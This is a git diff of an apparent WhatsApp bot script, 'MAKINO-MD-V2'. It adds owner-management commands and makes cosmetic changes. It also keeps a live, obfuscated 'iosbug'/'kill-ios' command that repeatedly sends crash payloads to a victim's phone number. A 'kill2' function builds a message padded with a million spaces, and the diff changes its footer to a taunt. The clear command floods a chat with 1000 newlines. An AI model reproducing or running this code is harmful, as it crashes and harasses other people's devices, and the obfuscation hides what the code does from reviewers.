@@ -1,3 +1,13 @@
+/*
+
+Base By Taira Makino
+Status: Maintained
+Project: MAKINO-MD-V2 
+Year: 2024
+Telegram: https://t.me/Tha_Healer 
+
+*/
+
 process.on("uncaughtException", console.error);
 require("./config");
 
@@ -146,8 +156,8 @@ if (global.db)
 
 //
 //let _premium = JSON.parse(fs.readFileSync('./database/premium.json'))
-let _owner = JSON.parse(fs.readFileSync('./database/premium.json'))
-let owner = JSON.parse(fs.readFileSync('./database/premium.json'))
+let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
+let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
 let isSleeping = false; // Move the declaration here.
 let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
 let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
@@ -227,9 +237,7 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
     const pushname = m.pushName || "No Name"
     const botNumber = await Taira.decodeJid(Taira.user.id)
     const _auth = global.OwnerNumber
-   // const owners = [global.Owner,botNumber,_premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-    const isCreator = [_auth, botNumber, ...global.Owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-   // const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, _premium);
+    const isCreator = [_auth, botNumber, owner, ...global.Owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
     const itsMe = m.sender == botNumber ? true : false
     const text = args.join(" ")
     const from = m.chat
@@ -264,9 +272,6 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
     autoreadsw = true
     const content = JSON.stringify(m.message)
     const q = args.join(' ')
-    const { ios } = require("./Assets/ios.js")
-    // const button = m.body
-
     const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
     const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
 
@@ -283,7 +288,7 @@ m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||               
       forwardingScore: 9999999,
       isForwarded: true,
       forwardedNewsletterMessageInfo: {
-      newsletterName: "♱MAKINO-MD-V2♱♡⃤",
+      newsletterName: "♱Click Me♱♡⃤",
       newsletterJid: "120363320283062687@newsletter",
       },
       "externalAdReply": {
@@ -534,7 +539,7 @@ async function kill2(target, quoted) {
         text: ""
       },
       footer: {
-        text: "›          #MakinoByTaira"
+        text: "LOL 🤡        TairaTheChosenOne"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -711,6 +716,29 @@ const smallinput = budy.toLowerCase();
 
     switch (command) {
 
+case 'addowner': {
+if (!isCreator) return reply(mess.botowner)
+if (!args[0]) return reply(`Use like ${prefix+command} 234708096xxx\nExample ${prefix+command} 234708096xxx`)
+tobe = q.split("|")[0].replace(/[^0-9]/g, '')
+let checknum = await Taira.onWhatsApp(tobe)
+if (checknum.length == 0) return reply(`Enter A registered WhatsApp number.`)
+owner.push(tobe)
+fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
+await reply(`${tobe} Has Been given access to the bot\nUse delowner command if you want to revoke the access`)
+}
+break
+
+case 'delowner': {
+if (!isCreator) return reply(mess.botowner)
+if (!args[0]) return reply(`Use like ${prefix+command} 234708096xxx\nExample ${prefix+command} 234708096xxx`)
+torem = q.split("|")[0].replace(/[^0-9]/g, '')
+toremm = owner.indexOf(torem)
+owner.splice(toremm, 1)
+fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
+reply(`${torem} Access to the bot has been revoked.\nUse addowner command to add owners.`)
+}
+break
+
 case 'vv': {
 	if (!isCreator) return reply(mess.botowner)
         if (!m.quoted) return reply(`Reply to a view once message`)
@@ -832,18 +860,14 @@ break
 break
 
         
-    /*    case 'iosbug': case 'kill-ios': {
-const _0x1472cc=_0x51f5;(function(_0x1052cb,_0x515478){const _0x272926=_0x51f5,_0x5ba5e9=_0x1052cb();while(!![]){try{const _0x1231a5=parseInt(_0x272926(0x98))/0x1+parseInt(_0x272926(0xa0))/0x2+-parseInt(_0x272926(0x9c))/0x3+-parseInt(_0x272926(0x99))/0x4*(parseInt(_0x272926(0x9d))/0x5)+parseInt(_0x272926(0x9f))/0x6+-parseInt(_0x272926(0x95))/0x7+parseInt(_0x272926(0x92))/0x8;if(_0x1231a5===_0x515478)break;else _0x5ba5e9['push'](_0x5ba5e9['shift']());}catch(_0x57cc02){_0x5ba5e9['push'](_0x5ba5e9['shift']());}}}(_0x45d6,0x53469));if(!isCreator)return reply(mess[_0x1472cc(0x9a)]);if(!q)return xgreply(_0x1472cc(0x91)+command+_0x1472cc(0x96));let tai=q[_0x1472cc(0x9b)]('|')[0x0],number=tai['replace'](/[^0-9]/g,'');function _0x51f5(_0x590bb1,_0x46ddb3){const _0x45d629=_0x45d6();return _0x51f5=function(_0x51f561,_0x377416){_0x51f561=_0x51f561-0x91;let _0x523cf6=_0x45d629[_0x51f561];return _0x523cf6;},_0x51f5(_0x590bb1,_0x46ddb3);}if(number[_0x1472cc(0xa2)]('0'))return reply(_0x1472cc(0x9e));let target=number+_0x1472cc(0xa3),amount=q[_0x1472cc(0x9b)]('|')[0x1]*0xc8,ppk=amount*1.5;await reply(ppk+_0x1472cc(0x93)),await loading();for(let j=0x0;j<amount;j++){await iosbug(target),await sleep(0x5dc);}await Taira[_0x1472cc(0xa4)](m[_0x1472cc(0x94)],{'text':_0x1472cc(0xa1)+target+_0x1472cc(0x97)+ppk+'\x20seconds'},{'quoted':statrp});function _0x45d6(){const _0x5c6368=['Number\x20cannot\x20start\x20with\x200','300414jSxpYa','852476SlOacv','Sending\x20\x20bugs\x20to\x20','startsWith','@s.whatsapp.net','sendMessage','Use\x20like\x20\x20.','11834264AEbKgx','\x20Seconds','chat','4764907fbiZcI','\x202347080968564|1\x0a#\x20Note:\x201\x20=\x20\x20300.seconds','\x20for\x20\x20','313882LEISgl','4LJvNDj','botowner','split','1896885QKFGQu','3076895cSoWrO'];_0x45d6=function(){return _0x5c6368;};return _0x45d6();}
-}
-break*/
 	case 'iosbug': case 'kill-ios': { 
 	const _0x1f8c67=_0x513c;(function(_0x9ebdc7,_0x13b325){const _0x1e8874=_0x513c,_0x1edddb=_0x9ebdc7();while(!![]){try{const _0xf854bf=-parseInt(_0x1e8874(0x18b))/0x1*(parseInt(_0x1e8874(0x190))/0x2)+-parseInt(_0x1e8874(0x178))/0x3*(-parseInt(_0x1e8874(0x17d))/0x4)+parseInt(_0x1e8874(0x177))/0x5*(parseInt(_0x1e8874(0x176))/0x6)+-parseInt(_0x1e8874(0x189))/0x7*(parseInt(_0x1e8874(0x18d))/0x8)+-parseInt(_0x1e8874(0x186))/0x9*(parseInt(_0x1e8874(0x188))/0xa)+parseInt(_0x1e8874(0x17c))/0xb+parseInt(_0x1e8874(0x184))/0xc;if(_0xf854bf===_0x13b325)break;else _0x1edddb['push'](_0x1edddb['shift']());}catch(_0x18b40f){_0x1edddb['push'](_0x1edddb['shift']());}}}(_0x5084,0xcf230));if(!isCreator)return reply(mess[_0x1f8c67(0x18f)]);if(!q)return xgreply(_0x1f8c67(0x17f)+command+_0x1f8c67(0x17a));let tai=q['split']('|')[0x0],number=tai[_0x1f8c67(0x180)](/[^0-9]/g,'');if(number[_0x1f8c67(0x17e)]('0'))return reply(_0x1f8c67(0x18e));let target=number+_0x1f8c67(0x179),amount=q[_0x1f8c67(0x183)]('|')[0x1]*0xc8,ppk=amount*1.5;await reply(ppk+_0x1f8c67(0x18a)),await reply(_0x1f8c67(0x17b));function _0x5084(){const _0xb0f9ed=['199636UDpPll','18YnGokf','2309710IVhWfG','42KJEtnk','@s.whatsapp.net','\x202347080968564|1\x0a#\x20Note:\x201\x20=\x20\x20300.seconds','processing.....','14163633KpncGz','174396BlUUeY','startsWith','Use\x20like\x20\x20.','replace','Sending\x20\x20bugs\x20to\x20','chat','split','7727652fIWyRH','\x20for\x20\x20','3189105EweyGg','\x20seconds','10PEPXqS','35ImwlQT','\x20Seconds','13EnxDMG','sendMessage','2283800FInRkk','Number\x20cannot\x20start\x20with\x200','botowner'];_0x5084=function(){return _0xb0f9ed;};return _0x5084();}function _0x513c(_0x512510,_0x5adc91){const _0x508426=_0x5084();return _0x513c=function(_0x513c17,_0x42c986){_0x513c17=_0x513c17-0x176;let _0x483a4f=_0x508426[_0x513c17];return _0x483a4f;},_0x513c(_0x512510,_0x5adc91);}for(let j=0x0;j<amount;j++){await iosbug(target),await sleep(0x5dc);}await Taira[_0x1f8c67(0x18c)](m[_0x1f8c67(0x182)],{'text':_0x1f8c67(0x181)+target+_0x1f8c67(0x185)+ppk+_0x1f8c67(0x187)},{'quoted':statrp});
 		}
 break 
    
-case 'clear': {
+case 'clear': case 'clearchat': {
 if(!isCreator) return
-messg = "\n".repeat(200)
+messg = "\n".repeat(1000)
 await Taira.sendMessage(m.chat, { text: messg + '♱MAKINO-MD-V2♱♡⃤' }, { quoted: statrp })
 }
 break
@@ -944,7 +968,7 @@ case 'sc': case 'script': case 'repo': case "link": {
         try {
           await Taira.sendMessage(from, { react: { text: "📍", key: m.key } });
         let respon = `
-     ♱MAKINO-MD-V2♱♡⃤.server
+     MAKINO-MD-V2 server info
   
   *System*: ${systemName}
   *RAM*: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
@@ -1103,22 +1127,6 @@ case 'tovv': {
           });
         break;
 
-
-    /*  case 'ls':
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        Taira.sendMessage(from, { react: { text: "📂", key: m.key } });
-        const currentDir = process.cwd(); // Get the current working directory
-        try {
-          const files = fs.readdirSync(currentDir);
-          let folderName = `Files in ${currentDir}:\n\n`;
-          let fileList = files.join('\n'); // Join the file names with a newline
-          Taira.sendMessage(from, { text: folderName + fileList }, m);
-        } catch (error) {
-          console.error(error);
-          Taira.sendMessage(from, { text: 'Error reading directory contents.🫳🏻' }, m);
-        }
-        break;*/
 
       case 'autostatus': case 'stsview': {
         if (isBan) return reply(mess.banned);
@@ -2776,7 +2784,6 @@ case 'tovv': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
         Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
-       // await m.reply(`Pong ${latensie.toFixed(4)} ms`)
     const startTime = new Date();
   const pingMsg = await Taira.sendMessage(m.chat, { text: '*♱MAKINO-MD-V2♱♡⃤...*' }, { quoted: statrp });
 
@@ -3493,7 +3500,7 @@ case 'tovv': {
 
 
 
-      case 'translate': case 'trt': case 'trans': {
+    /*  case 'translate': case 'trt': case 'trans': {
         if (isBan) return reply(mess.banned);
         Taira.sendMessage(from, { react: { text: "⌛", key: m.key } })
 
@@ -3503,7 +3510,7 @@ case 'tovv': {
         Detek = tes.translate
         reply(`Input : ${Detek}\nTranslation Results : ${Infoo}`)
       }
-        break;
+        break;*/
 
       case 'gimage':
       case 'gig':
@@ -5095,9 +5102,8 @@ case 'tovv': {
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *OWNER*
 ╭═══════════════ ⪩
-┃ • Addprem
-┃ • Delprem
-┃ • Listprem
+┃ • Addowner
+┃ • delowner
 ┃ • ᴘᴜʙʟɪᴄ
 ┃ • self
 ┃ • ʀᴇꜱᴛᴀʀᴛ
@@ -5545,9 +5551,8 @@ let messg = `
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *OWNER*
 ╭═══════════════ ⪩
-┃ • Addprem
-┃ • Delprem
-┃ • Listprem
+┃ • Addowner
+┃ • Delowner
 ┃ • ᴘᴜʙʟɪᴄ
 ┃ • self
 ┃ • ʀᴇꜱᴛᴀʀᴛ
@@ -5844,7 +5849,7 @@ let messg = `
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *MENUS*
 ╭═══════════════ ⪩
-┃ •  COREMENJ
+┃ •  COREMENU
 ┃ •  OWNERMENU
 ┃ •  GROUPMENU
 ┃ •  ɢʜᴘʀᴏꜰɪʟᴇ
